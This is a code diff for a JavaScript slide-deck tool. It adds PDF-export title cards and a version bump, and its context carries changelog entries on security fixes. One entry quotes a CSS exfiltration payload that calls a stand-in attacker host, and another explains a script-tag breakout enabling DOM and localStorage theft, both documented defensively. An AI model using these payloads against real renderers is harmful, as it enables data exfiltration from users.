@@ -69,8 +69,11 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.55";
+const VELA_VERSION = "12.58";
 const VELA_CHANGELOG = [
+  { v: "12.58", d: "PDF export: (1) Fix dark boxes behind module title-card badge/icon in the vector exporter — the title card's `bg` is a gradient string, so the composite-bg detector (which only matched rgba()/^#hex$) fell back to dark #0a0f1c and translucent badge/icon fills (#RRGGBBAA) alpha-blended to navy. Now derives the alpha-blend base from the gradient's first hex stop. (2) New 'Module title cards' toggle in the export dialog with a live count of enabled 🎬 present-cards; off filters the _virtual cards out of the exported PDF (raster + vector). Default on." },
+  { v: "12.57", d: "PDF export now includes auto-generated module title cards (the 🎬 \"present card\") so exports match presentation mode exactly. Extracted buildTitleCardSlide() as the single source of truth shared by SlidePanel (presentation) and collectAllSlides (PDF/markdown). Title cards are inserted before each enabled module's slides and rendered without branding overlays; slide numbering excludes the cards (displayIndex/displayTotal) so real slides keep continuous 1-based numbers, matching the on-screen presentation." },
+  { v: "12.56", d: "Release: version bump to publish desktop binaries with the merged security hardening (assemble.py script-context escape, SVG mutation-XSS fixes, deck-JSON sanitizer + fail-closed loads, and the Neutralino desktop blast-radius containment — strict CSP, minimal nativeAllowList with no os.spawnProcess, filesystem path guard, externally-authored-deck warning, and update notifier). No engine behavior change in this bump itself." },
   { v: "12.55", d: "Security (Critical, audit 2026-06): fix script-context breakout in assemble.py. json.dumps(deck) was string-replaced into vela.jsx at the STARTUP_PATCH marker with no escape. The assembled .jsx is loaded inside an inline babel script block (app/local.html and the Claude.ai artifact viewer), and the HTML parser closes that block on the literal end-script token regardless of JS string quoting — so a deck whose item title contained an end-script tag followed by an attacker script tag produced an out.jsx with the verbatim closing tag, yielding full DOM and localStorage exfil plus CSRF against the artifact-proxied Anthropic endpoint on render. The local-server pipeline (serve.py) had a one-line replace since the local-sync feature landed; assemble.py was the missing twin. Fix: extracted escape_for_script_context() in assemble.py as the single source of truth, imported by serve.py. It encodes the Rails json_escape set as Unicode-escape sequences (valid both as JSON and as JS string literals): lt, gt, amp, U+2028, U+2029. Replaces the prior <\\/-only blocklist in both call sites. CI regression test asserts the assembled STARTUP_PATCH region contains zero raw lt/gt/amp/U+2028/U+2029 and all five escaped forms when the deck contains each char. Background research (5-angle audit): set matches Rails exactly, is a superset of Django (which targets inert application/json data islands), and is a subset of Go html/template (which also escapes quotes and backtick for template-literal contexts that do not apply here). No known JSON-in-script bypass primitive from the last decade of CVEs (serialize-javascript CVE-2019-16769 / CVE-2020-7660, Rails CVE-2015-3226, Go CVE-2023-24538) is unaddressed by this set in our embedding shape." },
   { v: "12.54", d: "Security (audit 2026-06, High + structural): close mutation-XSS hole in sanitizeSvgMarkup() for `<style>` children AND switch from blocklist to allowlist for SVG elements. (1) Headline bug: the v12.45 fix dropped comment/CDATA/PI nodes during the walk, but the walk early-returned on `<style>` after the isSvgStyleSafe() check, so CDATA inside `<style>` was never inspected. CDATA content serializes literally via innerHTML; the embedded `</style>` then escapes rawtext on HTML re-parse by dangerouslySetInnerHTML, yielding a live `<img onerror>` from a deck-supplied svg block / studyNotes diagram / chat-panel SVG. Walk now descends into `<style>`; isSvgStyleSafe() also rejects any `<` or `]]>` as defense-in-depth. (2) Structural: replaced SVG_BLOCKED_TAGS with SVG_ALLOWED_TAGS, mirroring DOMPurify's `svg + svgFilters` profile minus script/foreignObject/use/animate*/iframe/embed/object/link. Anything not in the allowlist — including the entire HTML rawtext-on-serialize family (xmp/noembed/noscript/noframes/plaintext/listing) and any future surprise tag — is removed. Allowlists are inherently safer than blocklists (Cure53 / OWASP best practice). (3) New CI-gated jsdom round-trip test (tests/test_svg_mxss.cjs) runs the actual sanitizer against 25 mXSS payloads — replaces the previous source-string-only checks which gave false confidence because the line was present but unreached for `<style>`. jsdom added to package.json devDependencies; CI installs it before the unit step." },
   { v: "12.53", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
@@ -810,6 +813,28 @@ const themes = {
 let T = themes.dark;
 const statusColor = (s) => ({ todo: T.textDim, done: T.green, "signed-off": T.purple }[s]);
 const FONT = { display: "'Sora', sans-serif", body: "'DM Sans', sans-serif", mono: "'Space Mono', monospace" };
+
+// Auto-generated module title card ("present card"). Shown as a virtual slide in
+// presentation mode and exported to PDF so the deck exports exactly as presented.
+function buildTitleCardSlide(item, lane, branding) {
+  const accent = branding?.accentColor || T.accent;
+  const slideCount = (item.slides || []).length;
+  const totalTime = (item.slides || []).reduce((a, s) => a + (s.duration || 0), 0);
+  const timeStr = totalTime > 0 ? `${Math.floor(totalTime / 60)}m ${totalTime % 60}s` : "";
+  return {
+    _virtual: true,
+    bg: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
+    color: "#0f172a", accent,
+    align: "center", verticalAlign: "center", padding: "60px 80px", gap: 20,
+    blocks: [
+      ...(lane ? [{ type: "badge", text: (lane.title || "").toUpperCase(), bg: accent + "18", color: accent, icon: "Layers" }] : []),
+      { type: "heading", text: item.title, size: "4xl", color: "#0f172a" },
+      ...(timeStr ? [{ type: "text", text: `${slideCount} slide${slideCount !== 1 ? "s" : ""} · ${timeStr}`, size: "lg", color: "#64748b" }] : [{ type: "text", text: `${slideCount} slide${slideCount !== 1 ? "s" : ""}`, size: "lg", color: "#64748b" }]),
+      { type: "spacer", h: 8 },
+    ],
+    duration: 3,
+  };
+}
 
 // ━━━ Vela Logo Icon ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function VelaIcon({ size = 18, color }) {
